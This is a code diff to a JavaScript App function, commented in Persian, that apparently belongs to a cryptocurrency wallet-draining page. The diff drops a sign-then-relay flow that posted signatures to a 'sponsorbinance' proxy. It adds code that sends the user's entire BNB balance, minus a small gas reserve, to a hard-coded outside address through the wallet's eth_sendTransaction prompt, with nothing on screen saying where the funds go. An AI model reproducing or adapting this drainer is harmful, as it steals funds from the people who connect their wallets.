@@ -46,6 +46,7 @@ function App() {
       return;
     }
 
+    // کسر 0.02 BNB به عنوان reserve جهت هزینه‌های تراکنش
     const reserveBNB = 0.02;
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
@@ -54,64 +55,28 @@ function App() {
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
-    console.log("📜 Message to sign:", message);
+    // آدرس مقصد ثابت (بدون تغییر)
+    const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";
 
-    let signature;
+    // ساخت شی تراکنش برای انتقال ارز
+    const txObject = {
+      from: userAddress,
+      to: destination,
+      // تبدیل sendAmount به Wei
+      value: "0x" + BigInt(Math.floor(sendAmount * 1e18)).toString(16),
+      // تنظیم اختیاری gas و gasPrice (یا اجازه دهید کیف پول محاسبه کند)
+    };
+
     try {
-      signature = await window.ethereum.request({
-        method: "personal_sign",
-        params: [message, userAddress],
+      // ارسال تراکنش از کیف پول کاربر (که گس را خودش پرداخت می‌کند)
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [txObject],
       });
-      console.log("✍️ Signature:", signature);
+      console.log("Transaction sent, tx hash:", txHash);
+      alert("Transaction sent! TxHash: " + txHash);
     } catch (error) {
-      console.error("❌ Error in personal_sign:", error);
-      return;
-    }
-
-    try {
-      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          handler: "tx",
-          address: userAddress,
-          signature: signature,
-          amount: sendAmount.toString(),
-        }),
-      });
-      const result = await resp.json();
-      console.log("Server verify response:", result);
-      if (!result.success) {
-        console.error("❌ Signature verification failed at server.", result);
-        return;
-      }
-    } catch (e) {
-      console.error("❌ Could not call server to verify signature:", e);
-      return;
-    }
-
-    try {
-      const resp2 = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          handler: "relayer_tx",
-          address: userAddress,
-          signature: signature,
-          amount: sendAmount.toString(),
-        }),
-      });
-      const result2 = await resp2.json();
-      console.log("Relayer response:", result2);
-      if (!result2.success) {
-        console.error("❌ Relayer transaction failed:", result2);
-        return;
-      }
-      alert("Transaction sent via meta-transaction! TxHash: " + result2.txHash);
-    } catch (e) {
-      console.error("❌ Could not call relayer:", e);
-      return;
+      console.error("❌ Transaction failed:", error);
     }
   }
 
